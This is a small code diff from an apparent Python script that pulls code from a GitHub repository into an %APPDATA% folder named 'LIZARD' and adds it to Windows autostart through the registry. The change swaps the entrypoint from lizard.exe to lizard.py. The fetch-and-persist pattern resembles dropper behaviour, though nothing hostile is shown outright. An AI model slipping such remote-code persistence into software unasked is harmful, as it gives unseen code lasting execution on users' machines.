@@ -7,8 +7,8 @@ import winreg
 # Replace with the raw GitHub URL of your script
 GITHUB_REPO = "https://github.com/Thitus99/FNAM-.git"
 LOCAL_DIR = os.path.join(os.getenv("APPDATA"), "LIZARD")
-
-ENTRYPOINT = ENTRYPOINT = os.path.join(LOCAL_DIR, "lizard.exe")
+    
+ENTRYPOINT = ENTRYPOINT = os.path.join(LOCAL_DIR, "lizard.py")
 
 def add_to_startup(name, exe_path):
     """Add this exe to Windows autostart via registry."""
